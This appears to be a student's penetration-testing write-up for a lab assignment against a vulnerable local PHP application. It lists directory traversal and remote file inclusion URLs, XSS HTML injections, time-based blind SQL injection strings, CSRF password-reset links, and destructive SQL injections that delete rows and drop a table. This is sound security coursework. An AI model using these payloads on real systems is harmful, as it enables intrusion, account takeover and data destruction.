# Penetration Testing Main Project
I will host all payloads successfully tested as part of this penetration testing tests assignment.

## Index.php

### Information Disclosure

When you create the ```secureappdev``` database in the beginning, via the ```index.php``` page, you can see that the username of 'admin' and 'user1' are exposed. Even worse, the passwords associated with those users are also exposed. Meaning I am able to sign-in to the either the 'admin' or 'user1' account via the portal.

![index](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/03871d07-9e1c-4551-8f08-6c9993338fda)


## Auth2.php

### Directory Traversal: 
```
http://localhost/Project23/auth2.php?FileToView=css/style.css
```
### File Inclusion:
```
http://localhost/Project23/auth2.php?FileToView=index.php
```
### XSS Reflective:
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-xss/main/Lab11-fixed.php
```
### NMAP Scan Results
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-mainproject/main/nmap.txt
```
<br/>
I was able to host my old assignment on Github and reference the public-hosted .PHP source page via the same ```FileToView``` parameter used to read the yellow.txt file stored in the same directory. The FileToView attribute doesn't just allow for reflective cross-site scripting, but you can see I am able to do directory traversal to the CSS directory as well as reading sensitive data from files such as SQL database which is also located in the same directory:
<br/>

![hosted](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/68013c1a-6a7f-4032-b1e3-2fb508263cef)

Syslog proof:

![sysdlog](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/3bdf433b-e698-4ca4-98d6-83f0b1cfb50a)



### Accessing unsecured Admin Portal (Redirects and Forwards):
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-mainproject/main/redirect-admin-portal.js
```

## NMAP Simulations

I will investigate the findings of the NMAP scan on the IP address 127.0.0.1 below: <br/>
https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/blob/main/nmap.txt

![nmap](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/5ef55aa8-37c8-4a8f-ac95-3396652511b8)

## ZAP Simulations

Looks like every page on the XAMPP webserver running on localhost has a clear ```absence of Anti-CSRF Tokens``` according to Zap intensive scan.

![anti-csrf](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/8bf4d191-f672-4464-832f-1f64547cfd20)


## Reflective XSS

Changed the colour to red on-load:
```
<span style="color: red; background-color: green; font-size: 20px;">nigel</span>
```


![defacement](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/84f36fde-4a31-4709-9a19-f9aa9a4184a4)



Video successfully loaded
```
<video width="50%" height="50%" controls><source src="http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/WhatCarCanYouGetForAGrand.mp4" type="video/mp4">nigel</video>
```

![video](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/f90febea-54a8-48c2-8f62-e910244f6ef8)



## Directory Traversal

Defacing the web application
```
http://localhost/Project23/auth2.php?FileToView=../../../xampp/htdocs/applications.html
```

Proving the web application runs on xampp web server
```
http://localhost/Project23/auth2.php?FileToView=../../../xampp/htdocs/index.php
```

Leaving XAMPP to the local Windows server
```
http://localhost/Project23/auth2.php?FileToView=../../../Windows/WinREQfe.log
```

![traversal](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/e20c8085-1686-46e7-afbf-ca2c28b45ac0)


## SQL Injection

This SQL injection attempt successfully runs a SELECT command, but naturally this does nothing malicious:
```
nigel' OR (user_id=3 AND 1=1 AND (SELECT user_admin FROM sapusers WHERE user_id=3 AND user_admin='0' LIMIT 1)) -- -
```

Username:
```
nigel' AND (SELECT sleep(2) FROM DUAL WHERE database() LIKE 's%' ); -- 
```

![username](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/86c87c1f-dbd6-4900-a653-823cb61a4f60)

Password:
```	
jellyFrog666!!' OR (SELECT sleep(2) FROM DUAL WHERE database() LIKE 's%') -- 
```
```
jellyFrog666!!' AND (SELECT sleep(2) FROM DUAL WHERE database() LIKE 's%') -- 
```

![password](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/e9233c8c-7038-47a0-9ef3-fb1b9c984061)




## Accessing CSRF Token

Proof of accessing the CSRF Token in the webpage:
![csrf](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/1683b11a-ba2a-4c40-868c-af8203fe01b2)

## Simulating a CSRF Attack

All I needed to do was add this URL as a hyperlink in an email. <br/>
Once clicked on, it changes the password with the CSRF token included <br/>
<br/>

#### Password Reset


```
http://localhost/Project23/includes/reset.inc.php?old=Hello123&new=Hello231&new_confirm=Hello231&reset=yes&csrf-token=6f6ceb06d80ef9a35c1217d670e8180da334c381a894554b578db6839f472532
```

![reset inc php](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/80c6e267-5d35-4ee6-8a39-e6c483e4434e)

#### User Registration

```
http://localhost/Project23/includes/register.php?uid=Rizzo&pwd=Hello231&submit[click]
```

#### Mike's Scenario
```
admin' OR (SELECT sleep(2) FROM DUAL WHERE database() LIKE 's%') -- 
```

```
admin' OR (DELETE FROM sapusers WHERE user_uid LIKE 'us%'); -- 
```

```
admin' OR 1=1 OR (DROP TABLE sapusers FROM DUAL WHERE database() LIKE 's%') -- 
```



